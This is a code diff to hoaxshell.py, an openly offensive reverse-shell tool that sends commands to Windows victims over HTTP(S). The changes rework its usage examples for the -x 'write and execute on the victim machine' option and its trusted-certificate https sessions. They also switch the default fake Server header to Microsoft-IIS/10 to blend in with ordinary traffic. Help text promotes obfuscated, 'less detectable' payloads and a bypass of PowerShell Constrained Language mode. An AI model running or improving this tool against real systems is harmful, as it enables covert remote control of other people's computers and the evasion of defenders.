@@ -64,17 +64,17 @@ Usage examples:
      sudo python3 hoaxshell.py -s <your_ip> -i -H "Authorization"
      
      # The same but with --exec-outfile (-x)
-     sudo python3 hoaxshell.py -s <your_ip> -i -H "Authorization" -x "C:\\Users\\\\\\$env:USERNAME\.local\hack.ps1"
+     sudo python3 hoaxshell.py -s <your_ip> -i -H "Authorization" -x "C:\\Users\\\\\\$env:USERNAME\\.local\\hack.ps1"
 
-  - Encrypted shell session (https):
+  - Encrypted shell session over https with a trusted certificate:
+  
+     sudo python3 hoaxshell.py -s <your.domain.com> -t -c </path/to/cert.pem> -k <path/to/key.pem>	 
+
+  - Encrypted shell session over https with a self-signed certificate (Not recommended):
 	  
      # First you need to generate self-signed certificates:
      openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
      sudo python3 hoaxshell.py -s <your_ip> -c </path/to/cert.pem> -k <path/to/key.pem>
-  
-  - Encrypted shell session with a trusted certificate:
-  
-     sudo python3 hoaxshell.py -s <your.domain.com> -t -c </path/to/cert.pem> -k <path/to/key.pem>
 
   - Encrypted shell session with reverse proxy tunneling tools:
   
@@ -98,7 +98,7 @@ parser.add_argument("-H", "--Header", action="store", help = "Hoaxshell utilizes
 parser.add_argument("-x", "--exec-outfile", action="store", help = "Provide a filename (absolute path) on the victim machine to write and execute commands from instead of using \"Invoke-Expression\". The path better be quoted. Be careful when using special chars in the path (e.g. $env:USERNAME) as they must be properly escaped. See usage examples for details. CAUTION: you won't be able to change directory with this method. Your commands must include ablsolute paths to files etc.")
 parser.add_argument("-r", "--raw-payload", action="store_true", help = "Generate raw payload instead of base64 encoded.")
 parser.add_argument("-o", "--obfuscate", action="store_true", help = "Obfuscate generated payload.")
-parser.add_argument("-v", "--server-version", action="store", help = "Provide a value for the \"Server\" response header (default: Apache/2.4.1)")
+parser.add_argument("-v", "--server-version", action="store", help = "Provide a value for the \"Server\" response header (default: Microsoft-IIS/10)")
 parser.add_argument("-g", "--grab", action="store_true", help = "Attempts to restore a live session (default: false).")
 parser.add_argument("-t", "--trusted-domain", action="store_true", help = "If you own a domain, use this option to generate a shorter and less detectable https payload by providing your DN with -s along with a trusted certificate (-c cert.pem -k privkey.pem). See usage examples for more details.")
 parser.add_argument("-cm", "--constraint-mode", action="store_true", help="Generate a payload that works even if the victim is configured to run PS in Constraint Language mode. By using this option, you sacrifice a bit of your reverse shell's stdout decoding accuracy.")
@@ -376,7 +376,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	hid = str(uuid.uuid4()).split("-")
 	header_id = f'X-{hid[0][0:4]}-{hid[1]}' if not args.Header else args.Header
 	SESSIONID = '-'.join([verify, get_cmd, post_res])
-	server_version = 'Apache/2.4.1' if not args.server_version else args.server_version
+	server_version = 'Microsoft-IIS/10' if not args.server_version else args.server_version
 	init_dir = None
 	
 	
@@ -771,7 +771,7 @@ def main():
 
 			print(f'[{INFO}] Type "help" to get a list of the available prompt commands.')
 			print(f'[{INFO}] Https Server started on port {server_port}.') if ssl_support else print(f'[{INFO}] Http Server started on port {server_port}.')
-			print(f'[{IMPORTANT}] {BOLD}Awaiting payload execution to initiate shell session...{END}')
+			print(f'[{IMPORTANT}] Awaiting payload execution to initiate shell session...')
 
 		else:
 			print(f'\r[{IMPORTANT}] Attempting to restore session. Listening for hoaxshell traffic...')
